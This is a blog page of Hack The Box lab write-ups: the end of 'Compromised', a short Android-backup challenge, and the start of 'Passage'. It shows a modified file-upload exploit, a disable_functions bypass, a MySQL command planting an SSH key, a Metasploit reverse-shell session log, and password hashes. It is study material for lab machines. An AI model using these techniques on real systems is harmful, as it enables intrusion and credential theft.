+<p>After research, found a php script able to bypass the restriction</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">PHP 7.0-7.3 disable_functions bypass</a></p>
+<p>Modified the script for the pwn function</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>Next modify the litecart poc</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;exploit.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">files = &#123;</span><br><span class="line">        <span class="string">&#x27;vqmod&#x27;</span>: (rand + <span class="string">&quot;.php&quot;</span>,data, <span class="string">&quot;application/xml&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>:one,</span><br><span class="line">        <span class="string">&#x27;upload&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;Upload&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>and we manage to gain <code>rce</code></p>
+<p><img src="/images/HTB-Compromised-Hard/image-20200918142412690.png" alt="image-20200918142412690"></p>
+<p>After trying hard to I found it seems www-data is very restricted, only very few command able to execute. I didnt manage to get a proper reverse shell.</p>
+<p>After long enumeration</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash</span><br><span class="line">mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash</span><br><span class="line">red:x:1001:1001::/home/red:/bin/false</span><br></pre></td></tr></table></figure>
+
+<p>I actually found that, mysql is a user. Went back to the initial foothold, I manage to find the mysql root username and password </p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Database</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_TYPE&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;changethis&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_DATABASE&#x27;</span>, <span class="string">&#x27;ecom&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_TABLE_PREFIX&#x27;</span>, <span class="string">&#x27;lc_&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_CONNECTION_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_PERSISTENT_CONNECTIONS&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>and we got the creds for mysql <code>root:changethis</code>. We can launch mysql client, execute commands to write our ssh public key to authorized_keys</p>
+<p><img src="/images/HTB-Compromised-Hard/image-20200918144023178.png" alt="image-20200918144023178"></p>
+<p>yeah, we manage to get code execution for user <code>mysql</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -pchangethis -e <span class="string">&quot;SELECT exec_cmd(&#x27;echo sshxxxxxxxxxxx&#x27; &gt; /var/lib/mysql/.ssh/authorized_keys)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>One thing to note here, you have to encode the <code>+</code> into <code>%2B</code> else it will be shown as a whitespace in authorized_keys file</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2</span><br><span class="line">mysql@compromised:~$ </span><br></pre></td></tr></table></figure>
+
+<p>and we are in using ssh.</p>
+<p>After more enumeration</p>
+<p><img src="/images/HTB-Compromised-Hard/image-20200918161643308.png" alt="image-20200918161643308"></p>
+<p>we found a new password <code>3*NLJE32I$Fe</code></p>
+<p>it turn up to be <code>sysadmin</code> ‘s password</p>
+<p>su and we got the user.txt</p>
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>We found a suspicious file <code>.pam_unix.so</code></p>
+<p>Use ghidra to reverse it.</p>
+<p>in <code>pam_sm_authenticate</code></p>
+<p>we found some backdoor string</p>
+<p><img src="/images/HTB-Compromised-Hard/image-20200918175358088.png" alt="image-20200918175358088"></p>
+<p>convert the unsigned-hex to char sequence</p>
+<p><img src="/images/HTB-Compromised-Hard/image-20200918175715611.png" alt="image-20200918175715611"></p>
+<p>and we got the password <code>zlke~U3Env82m2-</code> with a null behind </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@compromised:~<span class="comment"># whoami &amp;&amp; hostname</span></span><br><span class="line">root</span><br><span class="line">compromised</span><br></pre></td></tr></table></figure>
+
+<br/>
+<br/>
+<br/>
+
+<p><img src="/images/root.gif" alt="root"></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/reverse/">reverse</a>           
+			            
+				<a class="link" href="/tags/mysql-exec-cmd/">mysql exec_cmd</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/09/17/HTB-Compromised/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/09/11/Challenge-Cat/">HTB::Challenge [Mobile] Cat</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Sep 11, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p><img src="/images/Challenge-Cat/image-20200911134041620.png" alt="image-20200911134041620"></p>
+<p>After extracting the file from zip, we got a <code>Andriod Backup </code> </p>
+<p>Upon google, we found a way to extract the file</p>
+<p><code>( printf &quot;\x1f\x8b\x08\x00\x00\x00\x00\x00&quot; ; tail -c +25 backup.ab ) |  tar xfvz -</code></p>
+<p>and we got 2 folders <code>apps</code> and <code>shared</code></p>
+<p>and we found this picture, the flag is at the bottom of the paper</p>
+<p><img src="/images/Challenge-Cat/image-20200911134438299.png" alt="image-20200911134438299"></p>
+<p>HTB{ThisBackupIsUnprotected}</p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox-challenge/">hackthebox-challenge</a>           
+		            
+				<a class="link" href="/categories/hackthebox-challenge/mobile/">mobile</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/09/11/Challenge-Cat/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/09/06/HTB-Passage/">HTB Passage Writeup</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Sep 06, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p><img src="/images/HTB-Passage-Medium/image-20200906132505581.png" alt="image-20200906132505581"></p>
+<h2 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h2><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun Sep  6 12:17:03 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Full_10.129.5.22.nmap 10.129.5.22</span></span><br><span class="line"><span class="title class_">Nmap</span> scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">5.22</span></span><br><span class="line"><span class="title class_">Host</span> is up (<span class="number">0.26</span>s latency).</span><br><span class="line"></span><br><span class="line"><span class="title class_">PORT</span>   <span class="title class_">STATE</span> <span class="title class_">SERVICE</span> <span class="title class_">VERSION</span></span><br><span class="line"><span class="number">22</span>/tcp open  ssh     <span class="title class_">OpenSSH</span> <span class="number">7.2</span>p2 <span class="title class_">Ubuntu</span> <span class="number">4</span> (<span class="title class_">Ubuntu</span> <span class="title class_">Linux</span>; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-<span class="symbol">hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">17</span><span class="symbol">:eb</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">e:</span><span class="number">23</span><span class="symbol">:ea</span><span class="symbol">:</span><span class="number">23</span><span class="symbol">:b6</span><span class="symbol">:b1</span><span class="symbol">:bc</span><span class="symbol">:c6</span><span class="symbol">:</span><span class="number">4</span><span class="symbol">f:</span><span class="symbol">db:</span><span class="number">98</span><span class="symbol">:d3</span><span class="symbol">:d4</span><span class="symbol">:a1</span> (<span class="title class_">RSA</span>)</span><br><span class="line">|   <span class="number">256</span> <span class="number">71</span><span class="symbol">:</span><span class="number">64</span><span class="symbol">:</span><span class="number">51</span><span class="symbol">:</span><span class="number">50</span><span class="symbol">:c3</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">f:</span><span class="number">18</span><span class="symbol">:</span><span class="number">47</span><span class="symbol">:</span><span class="number">03</span><span class="symbol">:</span><span class="number">98</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">e:</span><span class="number">5</span><span class="symbol">e:</span><span class="symbol">b8:</span><span class="number">10</span><span class="symbol">:</span><span class="number">19</span><span class="symbol">:fc</span> (<span class="title class_">ECDSA</span>)</span><br><span class="line">|_  <span class="number">256</span> <span class="symbol">fd:</span><span class="number">56</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">a:</span><span class="symbol">f8:</span><span class="symbol">d0:</span><span class="number">60</span><span class="symbol">:a7</span><span class="symbol">:f1</span><span class="symbol">:a0</span><span class="symbol">:a1</span><span class="symbol">:</span><span class="number">47</span><span class="symbol">:a4</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:d6</span><span class="symbol">:a8</span><span class="symbol">:a1</span> (<span class="title class_">ED25519</span>)</span><br><span class="line"><span class="number">80</span>/tcp open  http    <span class="title class_">Apache</span> httpd <span class="number">2.4</span>.<span class="number">18</span> ((<span class="title class_">Ubuntu</span>))</span><br><span class="line">|_http-server-<span class="symbol">header:</span> <span class="title class_">Apache</span>/<span class="number">2.4</span>.<span class="number">18</span> (<span class="title class_">Ubuntu</span>)</span><br><span class="line">|_http-<span class="symbol">title:</span> <span class="title class_">Passage</span> <span class="title class_">News</span></span><br><span class="line"><span class="title class_">Service</span> <span class="symbol">Info:</span> <span class="symbol">OS:</span> <span class="title class_">Linux</span>; <span class="symbol">CPE:</span> <span class="symbol">cpe:</span>/<span class="symbol">o:</span><span class="symbol">linux:</span>linux_kernel</span><br><span class="line"></span><br><span class="line"><span class="title class_">Service</span> detection performed. <span class="title class_">Please</span> report any incorrect results at <span class="symbol">https:</span>//nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun Sep  6 12:17:20 2020 -- 1 IP address (1 host up) scanned in 16.72 seconds</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>We found the site has implement fail2ban, which it will block certain IP address if it touches the threshold, gobuster might not work here.</p>
+<p><img src="/images/HTB-Passage-Medium/image-20200906132744866.png" alt="image-20200906132744866"></p>
+<p><strong><a target="_blank" rel="noopener" href="http://www.passage.htb/cutenews">http://www.passage.htb/cutenews</a></strong></p>
+<p>Version CuteVews 2.1.2 , rating more towards CVE</p>
+<p><img src="/images/HTB-Passage-Medium/image-20200906132844233.png" alt="image-20200906132844233"></p>
+<p><img src="/images/HTB-Passage-Medium/image-20200906132903154.png" alt="image-20200906132903154"></p>
+<p>Use searchsploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/opt/nmapAutomator/10.129.5.22/nmap]</span><br><span class="line">└─<span class="comment"># searchsploit cutenews | grep 2.1.2</span></span><br><span class="line">CuteNews 2.1.2 - <span class="string">&#x27;avatar&#x27;</span> Remote Code Execution (Metasploit)                                | php/remote/46698.rb</span><br><span class="line">CuteNews 2.1.2 - Arbitrary File Deletion                                                    | php/webapps/48447.txt</span><br><span class="line">CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                        | php/webapps/48458.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Found Metasploit module, msfconsole was not able to search the module, therefore we have to add it manually.</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp <span class="number">46698</span>.rb <span class="regexp">/usr/</span>share<span class="regexp">/metasploit-framework/m</span>odules<span class="regexp">/exploits/</span>linux<span class="regexp">/http/</span><span class="number">46698</span>.rb</span><br></pre></td></tr></table></figure>
+
+<p>and we will have error saying out file unable to load. Because there’s some error in this ruby file (Why offsec would keep bad module ?)</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;References&#x27;</span> =&gt;</span><br><span class="line">    [</span><br><span class="line">      [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html&#x27;</span>],   <span class="regexp">//</span> &lt;---- <span class="title class_">Add</span> a comma here to fix</span><br><span class="line">      [<span class="string">&#x27;URL&#x27;</span>, <span class="string">&#x27;http://cutephp.com&#x27;</span>] <span class="comment"># Official Website</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>First, we have to register a account</p>
+<p><img src="/images/HTB-Passage-Medium/image-20200906134157017.png" alt="image-20200906134157017"></p>
+<p><img src="/images/HTB-Passage-Medium/image-20200906134206315.png" alt="image-20200906134206315"></p>
+<p>Next, open up msfconsole, load the module we just added</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">reload_all</span></span><br></pre></td></tr></table></figure>
+
+<p>And this is our options </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(linux/http/46698) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/46698):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD   ikonw            no        Password to authenticate with</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     10.129.5.22      <span class="built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /CuteNews        <span class="built_in">yes</span>       Base CutePHP directory path</span><br><span class="line">   USERNAME   ikonw            <span class="built_in">yes</span>       Username to authenticate with</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.14.6       <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">   </span><br><span class="line">msf5 exploit(linux/http/46698) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.6:4444 </span><br><span class="line">[*] http://10.129.5.22:80 - CuteNews is 2.1.2</span><br><span class="line">[+] Authentication was successful with user: ikonw</span><br><span class="line">[*] Trying to upload ouriwixb.php</span><br><span class="line">[+] Upload successfully.</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.129.5.22</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.6:4444 -&gt; 10.129.5.22:37850) at 2020-09-06 13:02:44 +0800</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>and we got the www-data user.</p>
+<p>We found 2 user</p>
+<p><strong>nadav</strong> and <strong>paul</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@passage:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">nadav  paul</span><br></pre></td></tr></table></figure>
+
+<p>Went back to web directory for more enumeration, try to see if any config file stores the users cred</p>
+<p><img src="/images/HTB-Passage-Medium/image-20200906151237004.png" alt="image-20200906151237004"></p>
+<p>Along the way we find out that CuteNews does not have database, all it’s data are store in PHP.</p>
+<p>For convivence, I zip the whole web folder and download it to local for more analysis.</p>
+<p>in cdata&#x2F;users folder we found some base64</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/…/passage/CuteNews/cdata/users]</span><br><span class="line">└─<span class="comment"># ls                                                                           </span></span><br><span class="line">09.php  16.php  32.php  42.php  5d.php  6c.php  73.php  7a.php  97.php  b0.php  c1.php  d4.php  d6.php  fb.php  lines</span><br><span class="line">0a.php  21.php  41.php  52.php  66.php  6e.php  77.php  8f.php  98.php  b8.php  c8.php  d5.php  e0.php  fc.php  users.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/…/passage/CuteNews/cdata/users]</span><br><span class="line">└─<span class="comment"># cat 09.php</span></span><br><span class="line">&lt;?php die(<span class="string">&#x27;Direct call - access denied&#x27;</span>); ?&gt;</span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319    </span><br></pre></td></tr></table></figure>
+
+
+
+<p>We extract out all the base64 hash and decrypt it at one</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/…/passage/CuteNews/cdata/users]</span><br><span class="line">└─<span class="comment"># cat * | grep -v &#x27;&lt;?php&#x27;                                                      </span></span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319</span><br><span class="line">YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=</span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=</span><br><span class="line">YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=</span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==</span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319</span><br><span class="line">YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=</span><br><span class="line">YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==</span><br><span class="line">YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=</span><br><span class="line">YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=</span><br><span class="line">YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Passage-Medium/image-20200906151626095.png" alt="image-20200906151626095"></p>
+<p>we can see that is all serialized objects.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;name&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span> =&gt; <span class="string">&#x27;1592483047&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;acl&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;email&#x27;</span> =&gt; <span class="string">&#x27;nadav@passage.htb&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;pass&#x27;</span> =&gt; <span class="string">&#x27;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;lts&#x27;</span> =&gt; <span class="string">&#x27;1592487988&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;ban&#x27;</span> =&gt; <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;cnt&#x27;</span> =&gt; <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>it contains email and password hash.</p>
+<p>went to hash.org and we know it’s a sha256 hash.</p>
+<p>we collect all the hashes </p>
